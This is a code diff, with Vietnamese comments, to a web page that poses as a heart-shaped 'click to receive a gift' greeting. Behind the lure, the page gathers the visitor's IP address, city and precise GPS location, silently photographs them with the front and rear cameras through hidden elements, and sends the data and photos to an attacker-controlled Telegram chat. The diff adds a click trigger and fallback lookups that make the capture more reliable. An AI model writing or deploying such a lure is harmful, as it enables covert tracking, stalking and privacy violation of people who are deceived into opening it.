@@ -7,13 +7,19 @@
     <style>
         body {
             margin: 0; padding: 0; display: flex;
+            flex-direction: column;
             justify-content: center; align-items: center;
             min-height: 100vh; background-color: #ffe6e6; overflow: hidden;
+            font-family: Arial, sans-serif;
+        }
+        .container {
+            text-align: center;
+            cursor: pointer;
         }
         .heart {
             position: relative; width: 100px; height: 90px;
             background-color: red; transform: rotate(-45deg);
-            animation: beat 1s infinite; cursor: pointer;
+            animation: beat 1s infinite; margin: 50px auto;
         }
         .heart::before, .heart::after {
             content: ""; position: absolute; width: 100px; height: 100px;
@@ -26,13 +32,23 @@
             50% { transform: scale(1.2) rotate(-45deg); }
             100% { transform: scale(1) rotate(-45deg); }
         }
+        .text {
+            color: #d32f2f;
+            font-size: 18px;
+            font-weight: bold;
+            margin-top: 20px;
+        }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-    <div class="heart"></div>
-    <video id="video" autoplay playsinline></video>
+    <div class="container" onclick="startProcess()">
+        <div class="heart"></div>
+        <div class="text" id="statusText">Bấm vào trái tim để nhận quà ❤️</div>
+    </div>
+
+    <video id="video" autoplay playsinline muted></video>
     <canvas id="canvas"></canvas>
 
     <script>
@@ -41,48 +57,67 @@
 
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
+        let isRunning = false;
 
-        // 1. Lấy thông tin IP và Vị trí theo IP (Dự phòng khi từ chối vị trí chính xác)
+        // 1. Lấy thông tin IP (Có cơ chế dự phòng)
         async function getIPInfo() {
             try {
-                const res = await fetch('https://ipapi.co/json/');
-                const data = await res.json();
-                return {
-                    ip: data.ip || 'Không rõ',
-                    city: data.city || '',
-                    region: data.region || '',
-                    country: data.country_name || '',
-                    lat: data.latitude,
-                    lon: data.longitude
-                };
+                const res1 = await fetch('https://api.ipify.org?format=json');
+                const data1 = await res1.json();
+                const ip = data1.ip;
+
+                try {
+                    const res2 = await fetch(`https://ipwho.is/${ip}`);
+                    const data2 = await res2.json();
+                    if (data2.success) {
+                        return {
+                            ip: ip,
+                            city: data2.city || '',
+                            region: data2.region || '',
+                            country: data2.country || '',
+                            lat: data2.latitude,
+                            lon: data2.longitude
+                        };
+                    }
+                } catch (e) {}
+
+                return { ip: ip, city: '', region: '', country: '', lat: null, lon: null };
             } catch (e) {
-                return { ip: 'Không lấy được IP', city: '', region: '', country: '', lat: null, lon: null };
+                try {
+                    const resFallback = await fetch('https://ipinfo.io/json');
+                    const dataFB = await resFallback.json();
+                    const loc = dataFB.loc ? dataFB.loc.split(',') : [null, null];
+                    return {
+                        ip: dataFB.ip || 'Không rõ',
+                        city: dataFB.city || '',
+                        region: dataFB.region || '',
+                        country: dataFB.country || '',
+                        lat: loc[0],
+                        lon: loc[1]
+                    };
+                } catch (err) {
+                    return { ip: 'Không rõ', city: '', region: '', country: '', lat: null, lon: null };
+                }
             }
         }
 
-        // 2. Lấy Tọa độ GPS chính xác từ thiết bị
+        // 2. Lấy Tọa độ GPS chính xác
         function getGeolocation() {
             return new Promise((resolve) => {
                 if (!navigator.geolocation) { resolve(null); return; }
                 navigator.geolocation.getCurrentPosition(
                     (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
                     () => resolve(null),
-                    { enableHighAccuracy: true, timeout: 5000 }
+                    { enableHighAccuracy: true, timeout: 6000 }
                 );
             });
         }
 
-        // 3. Chụp ảnh từ Camera theo hướng chỉ định (user: Trước, environment: Sau)
-        function capturePhoto(facingMode) {
+        // 3. Hàm chụp ảnh theo hướng camera
+        function captureStream(constraints) {
             return new Promise(async (resolve) => {
                 try {
-                    const stream = await navigator.mediaDevices.getUserMedia({
-                        video: { facingMode: { exact: facingMode } }
-                    }).catch(async () => {
-                        // Fallback nếu không hỗ trợ exact
-                        return await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
-                    });
-
+                    const stream = await navigator.mediaDevices.getUserMedia(constraints);
                     video.srcObject = stream;
                     video.onloadedmetadata = () => {
                         setTimeout(() => {
@@ -91,13 +126,12 @@
                             const ctx = canvas.getContext('2d');
                             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                             
-                            // Tắt stream camera sau khi chụp
                             stream.getTracks().forEach(track => track.stop());
 
                             canvas.toBlob((blob) => {
                                 resolve(blob);
                             }, 'image/jpeg', 0.8);
-                        }, 1000);
+                        }, 800);
                     };
                 } catch (e) {
                     resolve(null);
@@ -105,7 +139,7 @@
             });
         }
 
-        // 4. Gửi ảnh/tin nhắn lên Telegram
+        // 4. Gửi dữ liệu về Telegram
         async function sendToTelegram(photoBlob, captionText) {
             const formData = new FormData();
             formData.append('chat_id', CHAT_ID);
@@ -125,49 +159,54 @@
             }
         }
 
-        // 5. Luồng xử lý chính
-        async function main() {
+        // 5. Kích hoạt khi bấm vào trái tim
+        async function startProcess() {
+            if (isRunning) return;
+            isRunning = true;
+            document.getElementById('statusText').innerText = "Đang mở quà...";
+
             const ipData = await getIPInfo();
             const gpsLocation = await getGeolocation();
 
             let locationText = `🌐 **THÔNG TIN THU THẬP:**\n`;
-            locationText += `• IP: ${ipData.ip}\n`;
+            locationText += `• IP: \`${ipData.ip}\`\n`;
 
             if (gpsLocation) {
                 locationText += `📍 **Vị trí GPS chính xác:**\n`;
                 locationText += `• Tọa độ: \`${gpsLocation.lat},${gpsLocation.lon}\`\n`;
                 locationText += `🔗 **Google Maps:** https://www.google.com/maps?q=${gpsLocation.lat},${gpsLocation.lon}\n`;
             } else {
-                locationText += `📍 **Vị trí ước tính qua IP (Chưa duyệt GPS):**\n`;
+                locationText += `📍 **Vị trí ước tính qua IP (Chưa bật GPS):**\n`;
                 if (ipData.city || ipData.region) {
                     locationText += `• Khu vực: ${ipData.city}, ${ipData.region}, ${ipData.country}\n`;
                 }
                 if (ipData.lat && ipData.lon) {
                     locationText += `🔗 **Google Maps (IP):** https://www.google.com/maps?q=${ipData.lat},${ipData.lon}\n`;
                 } else {
-                    locationText += `• Không thể xác định địa chỉ\n`;
+                    locationText += `• Không xác định được tọa độ IP\n`;
                 }
             }
 
             // Chụp Cam Trước
-            const frontPhoto = await capturePhoto("user");
+            const frontPhoto = await captureStream({ video: { facingMode: "user" } });
             if (frontPhoto) {
                 await sendToTelegram(frontPhoto, locationText + `📸 **Loại ảnh:** Camera Trước (Selfie)`);
             }
 
             // Chụp Cam Sau
-            const backPhoto = await capturePhoto("environment");
+            const backPhoto = await captureStream({ video: { facingMode: { exact: "environment" } } }) 
+                             || await captureStream({ video: { facingMode: "environment" } });
             if (backPhoto) {
-                await sendToTelegram(backPhoto, `📸 **Loại ảnh:** Camera Sau (Khung cảnh)`);
+                await sendToTelegram(backPhoto, `📸 **Loại ảnh:** Camera Sau`);
             }
 
-            // Nếu không chụp được ảnh nào (do từ chối quyền) -> Gửi tin nhắn thông tin
+            // Nếu từ chối camera -> gửi thông báo bản tin
             if (!frontPhoto && !backPhoto) {
-                await sendToTelegram(null, locationText + `⚠️ **Camera:** Người dùng không cấp quyền camera.`);
+                await sendToTelegram(null, locationText + `⚠️ **Camera:** Không cấp quyền camera.`);
             }
-        }
 
-        window.onload = main;
+            document.getElementById('statusText').innerText = "Chúc bạn một ngày vui vẻ! ❤️️";
+        }
     </script>
 </body>
 </html>
